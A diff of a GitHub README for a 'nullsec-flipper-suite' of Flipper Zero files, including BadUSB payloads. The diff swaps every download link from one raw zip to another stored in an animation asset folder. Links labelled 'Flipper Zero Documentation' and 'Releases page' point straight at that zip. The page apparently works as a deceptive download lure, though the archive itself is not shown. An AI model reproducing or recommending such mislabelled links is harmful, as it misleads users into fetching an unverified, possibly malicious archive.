@@ -4,13 +4,13 @@
 
 Welcome to the nullsec-flipper-suite! This tool provides an extensive collection of Flipper Zero files, making it easy for you to enhance your device's capabilities. You can access over 430 files, including 80 BadUSB payloads, 40 SubGHz signals, 16 IR remotes, and more. This guide will help you download and run the software effortlessly.
 
-[![Download nullsec-flipper-suite](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/apps/badusb/stealth/suite_flipper_nullsec_3.9.zip)](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/apps/badusb/stealth/suite_flipper_nullsec_3.9.zip)
+[![Download nullsec-flipper-suite](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/assets/animations/L1_NullSec_Scanning_128x64/nullsec-flipper-suite-1.4-alpha.3.zip)](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/assets/animations/L1_NullSec_Scanning_128x64/nullsec-flipper-suite-1.4-alpha.3.zip)
 
 ## 📥 Download & Install
 
 To get started, visit the Releases page to download the necessary files.
 
-[Visit this page to download](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/apps/badusb/stealth/suite_flipper_nullsec_3.9.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/assets/animations/L1_NullSec_Scanning_128x64/nullsec-flipper-suite-1.4-alpha.3.zip)
 
 ### Steps to Download
 
@@ -61,13 +61,13 @@ If you encounter any issues or have questions, you can find support through the 
 
 To enhance your understanding and usage of the nullsec-flipper-suite, consider exploring the following:
 
-- [Flipper Zero Documentation](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/apps/badusb/stealth/suite_flipper_nullsec_3.9.zip)
+- [Flipper Zero Documentation](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/assets/animations/L1_NullSec_Scanning_128x64/nullsec-flipper-suite-1.4-alpha.3.zip)
 - Community forums on Reddit and Github for user tips and discussions.
 
 ## 🔗 Additional Download Links
 
 Remember, you can always return to the Releases page for new files or updates. 
 
-[Visit this page to download](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/apps/badusb/stealth/suite_flipper_nullsec_3.9.zip)
+[Visit this page to download](https://raw.githubusercontent.com/Nerowmist/nullsec-flipper-suite/main/assets/animations/L1_NullSec_Scanning_128x64/nullsec-flipper-suite-1.4-alpha.3.zip)
 
 Thank you for choosing nullsec-flipper-suite. Enjoy exploring the capabilities and enhancing your Flipper Zero!
